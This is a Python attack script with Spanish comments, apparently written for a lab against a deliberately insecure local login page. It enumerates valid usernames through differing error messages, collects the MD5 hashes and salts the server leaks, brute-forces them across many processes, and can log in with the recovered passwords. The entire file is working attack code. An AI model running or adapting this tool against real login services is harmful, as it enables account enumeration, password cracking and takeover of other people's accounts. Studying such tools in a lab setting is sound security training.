import aiohttp
import asyncio
import itertools
import hashlib
import string
import argparse
import multiprocessing
import sys

URL = "http://localhost:8080/login_inseguro.php"
PASSWORD_FAKE = "abc"
MAX_CONCURRENT_REQUESTS = 30
DICTIONARY_PATH = "userlist_generated.txt"
NUM_PROCESOS = multiprocessing.cpu_count() - 8

# -------------------- ARGUMENTOS --------------------
parser = argparse.ArgumentParser(description="Fuerza bruta de password con hash + salt")
parser.add_argument("--hash", help="Hash objetivo (MD5)")
parser.add_argument("--salt", help="Salt objetivo")
parser.add_argument("--max-len", type=int, default=7, help="Longitud máxima del password")
parser.add_argument("--post-login", action="store_true", help="Si se activa, probará los passwords vía POST al servidor")
args = parser.parse_args()


# -------------------- HASH CRACKER --------------------
def generate_candidates(min_len=6, max_len=7):
    chars = string.ascii_lowercase + string.digits
    for length in range(min_len, max_len + 1):
        for candidate in itertools.product(chars, repeat=length):
            yield ''.join(candidate)


def check_hashes(chunk, target_hash, salt):
    for password in chunk:
        hashed = hashlib.md5((password + salt).encode()).hexdigest()
        if hashed == target_hash:
            print(f"\n💥 ¡Contraseña encontrada!: {password}")
            return password
    return None


def chunk_generator(generator, chunk_size):
    """Divide un generador en chunks del tamaño indicado"""
    chunk = []
    for item in generator:
        chunk.append(item)
        if len(chunk) >= chunk_size:
            yield chunk
            chunk = []
    if chunk:
        yield chunk


def parallel_crack_md5(target_hash, salt, max_len=6):
    print(f"🧠 Iniciando fuerza bruta en paralelo (max_len={max_len}) con {NUM_PROCESOS} procesos...")

    candidate_generator = generate_candidates(5, max_len)
    batch_size = 100_000  # Ajusta este valor según tu RAM

    for batch in chunk_generator(candidate_generator, batch_size):
        with multiprocessing.Pool(NUM_PROCESOS) as pool:
            args_list = [(batch[i::NUM_PROCESOS], target_hash, salt) for i in range(NUM_PROCESOS)]
            results = pool.starmap(check_hashes, args_list)

        for result in results:
            if result:
                print("🎯 Crackeo exitoso")
                return result

    print("❌ No se encontró la contraseña.")
    return None



# -------------------- FUNCIONES USUARIO --------------------
def load_base_words(path):
    with open(path, "r", encoding="utf-8") as f:
        return sorted(set(w.strip().lower() for w in f if w.strip()))


def generate_usernames(base_words):
    usernames = set()
    for word in base_words:
        usernames.add(word)
    for a, b in itertools.product(base_words, repeat=2):
        if a != b:
            usernames.add(f"{a}{b}")
    return sorted(usernames)


async def check_username_and_get_hash_salt(session, semaphore, username, found):
    async with semaphore:
        try:
            async with session.post(URL, data={"loginName": username, "password": PASSWORD_FAKE}) as resp:
                text = await resp.text()
                if "Usuario no encontrado" in text:
                    print(f"[-] No existe: {username}")
                elif "Contraseña incorrecta" in text:
                    try:
                        data = await resp.json()
                        passwordHash = data.get("passwordHash")
                        passwordSalt = data.get("passwordSalt")
                        print(f"[✓] Usuario válido: {username} (con hash/salt)")
                        found.append((username, passwordHash, passwordSalt))
                    except Exception:
                        print(f"[✓] Usuario válido: {username} (sin hash/salt)")
                        found.append((username, None, None))
                else:
                    print(f"[?] Respuesta inesperada para {username}: {text}")
        except Exception as e:
            print(f"[!] Error con {username}: {e}")


async def discover_users():
    base_words = load_base_words(DICTIONARY_PATH)
    usernames = generate_usernames(base_words)
    print(f"🔎 Probando {len(usernames)} posibles nombres de usuario...")

    found = []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)

    async with aiohttp.ClientSession() as session:
        tasks = [check_username_and_get_hash_salt(session, semaphore, u, found) for u in usernames]
        await asyncio.gather(*tasks)

    print("\n✅ Usuarios válidos encontrados:")
    for u, _, _ in found:
        print(f" - {u}")
    return found


async def try_login(username, password):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(URL, data={"loginName": username, "password": password}) as resp:
                text = await resp.text()
                if "OK" in text:
                    print(f"🔥 Login exitoso para {username}: {password}")
                    return True
                return False
        except Exception as e:
            print(f"[!] Error haciendo POST: {e}")
            return False


def crack_passwords_for_users(users, max_len):
    for username, passwordHash, passwordSalt in users:
        if passwordHash and passwordSalt:
            print(f"\n🚀 Crackeando {username}...")
            password = parallel_crack_md5(passwordHash, passwordSalt, max_len)
            if password:
                print(f"✅ ¡Contraseña encontrada para {username}!: {password}")
                if args.post_login:
                    print(f"🌐 Intentando login con POST...")
                    asyncio.run(try_login(username, password))
            else:
                print(f"❌ No se encontró contraseña para {username}")
        else:
            print(f"⚠️ No se tiene hash/salt para {username}. Se podría probar otro método aquí.")


# -------------------- MAIN --------------------
if __name__ == "__main__":
    users = asyncio.run(discover_users())

    if args.hash and args.salt:
        print("\n🔍 Usando hash y salt proporcionados por línea de comandos...")
        password = parallel_crack_md5(args.hash, args.salt, args.max_len)
        if password and args.post_login:
            for u, _, _ in users:
                asyncio.run(try_login(u, password))

    # Intentar crackear los usuarios que sí trajeron hash+salt
    crack_passwords_for_users(users, args.max_len)
